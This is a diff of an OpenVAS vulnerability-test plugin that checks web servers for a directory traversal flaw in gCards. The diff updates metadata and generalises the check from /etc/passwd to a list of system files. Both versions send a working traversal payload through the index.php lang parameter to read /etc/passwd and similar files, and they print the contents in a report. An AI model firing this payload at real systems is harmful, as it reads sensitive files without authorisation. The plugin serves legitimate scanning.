@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gcards_dir_transversal.nasl 10781 2018-08-06 07:41:20Z cfischer $
+# $Id: gcards_dir_transversal.nasl 11672 2018-09-28 10:48:17Z jschulte $
 #
 # gCards Multiple Vulnerabilities
 #
@@ -8,7 +8,7 @@
 # Josh Zlatin-Amishav (josh at ramat dot cc)
 #
 # Copyright:
-# Copyright (C) 2006 Josh Zlatin-Amishav
+# Copyright (C) 2008 Josh Zlatin-Amishav
 #
 # This program is free software; you can redistribute it and/or modify
 # it under the terms of the GNU General Public License version 2,
@@ -27,8 +27,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.80065");
-  script_version("$Revision: 10781 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-08-06 09:41:20 +0200 (Mon, 06 Aug 2018) $");
+  script_version("$Revision: 11672 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-28 12:48:17 +0200 (Fri, 28 Sep 2018) $");
   script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
@@ -40,8 +40,8 @@ if(description)
   script_name("gCards Multiple Vulnerabilities");
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
-  script_copyright("This script is Copyright (C) 2006 Josh Zlatin-Amishav");
-  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_copyright("This script is Copyright (C) 2008 Josh Zlatin-Amishav");
+  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
@@ -78,45 +78,54 @@ if(description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_http_port(default:80);
 if (!can_host_php(port:port)) exit(0);
 
-foreach dir( make_list_unique( "/gcards", cgi_dirs( port:port ) ) ) {
+files = traversal_files();
 
-  if( dir == "/" ) dir = "";
+foreach dir(make_list_unique("/gcards", cgi_dirs(port:port))) {
+
+  if(dir == "/") dir = "";
   lang = "vuln-test";
-  url = string( dir, "/index.php?setLang=", lang, "&lang[", lang, "][file]=../../../../../../../../../../../../etc/passwd");
-  req = http_get( item:url, port:port );
-  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
-  if (isnull(res)) continue;
 
-  # There's a problem if...
-  if (
-    egrep(pattern:">gCards</a> v.*Graphics by Greg gCards", string:res) &&
-    (
-      # there's an entry for root or ...
-      egrep(pattern:"root:.*:0:[01]:", string:res) ||
-      # we get an error claiming the file doesn't exist or...
-      egrep(pattern:"main\(inc/lang/.+/etc/passwd\).+ failed to open stream: No such file or directory", string:res) ||
-      # we get an error about open_basedir restriction
-      egrep(pattern:"main.+ open_basedir restriction in effect\. File\(\./inc/lang/.+/etc/passwd", string:res)
-    )
-  ) {
-    if (egrep(pattern:"root:.*:0:[01]:", string:res))
-      content = res - strstr(res, '<!DOCTYPE HTML PUBLIC');
+  foreach pattern(keys(files)) {
 
-    if (content)
-      report = string(
-        "Here are the contents of the file '/etc/passwd' that\n",
-        "the scanner was able to read from the remote host :\n",
-        "\n",
-        content
-      );
-    else report = "";
+    file = files[pattern];
 
-    security_message(port:port, data:report);
-    exit(0);
+    url = string( dir, "/index.php?setLang=", lang, "&lang[", lang, "][file]=../../../../../../../../../../../../" + file);
+    req = http_get( item:url, port:port );
+    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
+    if (isnull(res)) continue;
+
+    # There's a problem if...
+    if (
+      egrep(pattern:">gCards</a> v.*Graphics by Greg gCards", string:res) &&
+      (
+        # there's an entry for root or ...
+        egrep(pattern:"root:.*:0:[01]:", string:res) ||
+        # we get an error claiming the file doesn't exist or...
+        egrep(pattern:"main\(inc/lang/.+/" + file + "\).+ failed to open stream: No such file or directory", string:res) ||
+        # we get an error about open_basedir restriction
+        egrep(pattern:"main.+ open_basedir restriction in effect\. File\(\./inc/lang/.+/" + file + "", string:res)
+      )
+    ) {
+      if (egrep(pattern:"pattern", string:res))
+        content = res - strstr(res, '<!DOCTYPE HTML PUBLIC');
+
+      if (content)
+        report = string(
+          "Here are the contents of the file '/" + file + "' that\n",
+          "the scanner was able to read from the remote host :\n",
+          "\n",
+          content
+        );
+      else report = "";
+
+      security_message(port:port, data:report);
+      exit(0);
+    }
   }
 }
 
